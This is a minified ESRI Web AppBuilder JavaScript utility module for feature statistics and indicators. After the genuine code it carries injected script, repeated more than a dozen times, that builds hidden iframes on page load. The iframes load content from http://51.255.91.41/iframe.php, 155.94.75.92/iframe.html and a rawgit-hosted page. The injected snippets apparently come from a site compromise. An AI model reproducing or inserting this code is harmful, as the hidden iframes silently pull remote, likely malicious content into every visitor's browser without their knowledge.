// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/on dojo/_base/lang dojo/_base/array esri/geometry/geometryEngine jimu/utils jimu/DataSourceManager jimu/statisticsUtils".split(" "),function(l,g,k,m,n,p,q){return{getClientFeaturesFromMap:function(a,c,f,d){var b=[],e=!1;f?0<c.getSelectedFeatures().length?(b=c.getSelectedFeatures(),e=!0):b=c.graphics:b=c.graphics;d&&(b=this._filterFeaturesByExtent(a.extent,b));if(0<b.length){var h=n.getObjectIdField(c);h&&(a=b[0])&&a.attributes&&a.attributes.hasOwnProperty(h)&&b.sort(function(a,b){a.attributes||
(a.attributes={});b.attributes||(b.attributes={});a=a.attributes[h];b=b.attributes[h];return a<b?-1:a>b?1:0})}b.isSelectedFeatures=e;return b},listenClientFeaturesFromMap:function(a,c,f,d,b){var e=[];f&&(e.push(l(c,"selection-complete",g.hitch(this,function(){b(this.getClientFeaturesFromMap(a,c,f,d))}))),e.push(l(c,"selection-clear",g.hitch(this,function(){b(this.getClientFeaturesFromMap(a,c,f,d))}))));d&&e.push(l(a,"extent-change",g.hitch(this,function(){0<c.graphics.length&&b(this.getClientFeaturesFromMap(a,
c,f,d))})));e.push(l(c,"update-end",g.hitch(this,function(){b(this.getClientFeaturesFromMap(a,c,f,d))})));b(this.getClientFeaturesFromMap(a,c,f,d));return{remove:function(){e&&k.forEach(e,g.hitch(this,function(a){a.remove()}));e=null}}},getVaildIndicator:function(a,c,f){var d=[];c.map(g.hitch(this,function(b){(b=this._handleOperator(b,a,f))&&d.push(b)}));if(0<d.length)return d[d.length-1]},getSingleValueFromFeatures:function(a,c,f){var d=p.getInstance(),b=0;if("Features"===a.type){if("DATA_SOURCE_FEATURE_LAYER_FROM_MAP"===
c.dataSourceType||"Features"===d.getDataSourceConfig(c.frameWorkDsId).type)return f.length;b=0;k.forEach(f,function(a){b+=a.attributes.count});return b}if("DATA_SOURCE_FEATURE_LAYER_FROM_MAP"===c.dataSourceType||"Features"===d.getDataSourceConfig(c.frameWorkDsId).type)return this._getStatsFromFeatures(f,a.fieldName,a.statisticsType);var e=0,h=0,b=0;k.forEach(f,function(c){var d=c.attributes[a.fieldName+"_"+a.statisticsType];switch(a.statisticsType){case "sum":e+=d;break;case "min":e=Math.min(e,d);
break;case "max":e=Math.max(e,d);break;case "avg":h+=c.attributes[a.fieldName+"_sum"],b+=c.attributes.count}});"avg"===a.statisticsType&&(e=0===b?0:h/b);return e},filterFeaturesByDataSourceSetting:function(a,c,f){if(0===a.length)return[];if(c.useSelection){var d=a[0].getLayer();if(d){var b=d.getSelectedFeatures();0<b.length&&(a=k.filter(a,function(a){return-1<b.indexOf(a)}))}}c.filterByExtent&&(a=this._filterFeaturesByExtent(f.extent,a));return a},_getStatsFromFeatures:function(a,c,f){return q.getStatisticsResultFromClientSync({featureSet:{features:a},
fieldName:c,statisticTypes:[f]})[f+"Field"]},_filterFeaturesByExtent:function(a,c){var f=a.normalize();return c=k.filter(c,g.hitch(this,function(a){try{if(a.geometry){var b="point"===a.geometry.type||"multipoint"===a.geometry;return k.some(f,g.hitch(this,function(c){return b?c.contains(a.geometry):m.intersects(c,a.geometry)}))}}catch(e){console.error(e)}return!1}))},_handleOperator:function(a,c,f){function d(a){b={};a.valueColor&&(b.valueColor=a.valueColor);a.gaugeColor&&(b.gaugeColor=a.gaugeColor);
a.iconInfo&&(b.iconInfo=a.iconInfo)}var b,e=a.value.map(g.hitch(this,function(b){return a.isRatio?b/100*f:b}));"greater"===a.operator&&c>e[0]?d(a):"smaller"===a.operator&&c<e[0]?d(a):"between"===a.operator&&c>e[0]&&c<e[1]?d(a):"equal"===a.operator&&c===e[0]?d(a):"notEqual"===a.operator&&c!==e[0]&&d(a);return b},isInteger:function(a){return"number"===typeof a&&0===a%1}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});